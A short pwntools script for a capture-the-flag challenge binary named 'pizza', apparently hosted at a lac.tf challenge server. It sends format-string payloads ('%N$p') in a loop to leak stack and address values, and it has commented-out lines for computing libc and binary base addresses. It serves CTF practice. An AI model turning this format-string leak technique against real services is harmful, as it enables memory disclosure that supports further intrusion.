#!/usr/bin/python3

from pwn import *

exe = ELF('pizza_patched', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # brva 0x12F0
                # brva 0x138B
                b *0x00005555555553fd
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.lac.tf', 31134)
else:
        p = process(exe.path)

GDB()
def send(payload1,payload2,payload3):
    sla(b'> ', '12')
    sla(b': ', payload1)
    sla(b'> ', '12')
    sla(b': ', payload2)
    sla(b'> ', '12')
    sla(b': ', payload3)
    print(p.recvuntil(b'ready soon.\n'))
    # libc.address = int(p.recvline(keepends=False), 16) - 0x2724a
    # exe.address = int(p.recvline(keepends=False), 16) - 0x1189
    # stack = int(p.recvline(keepends=False), 16)

    # info("libc: " + hex(libc.address))
    # info("exe: " + hex(exe.address))
    # info("stack: " + hex(stack))
    sla(b': ', b'y')
for i in range(60, 90, 3):
    send(f"%{i}$p", f"%{i+1}$p", f"%{i+2}$p")

p.interactive()
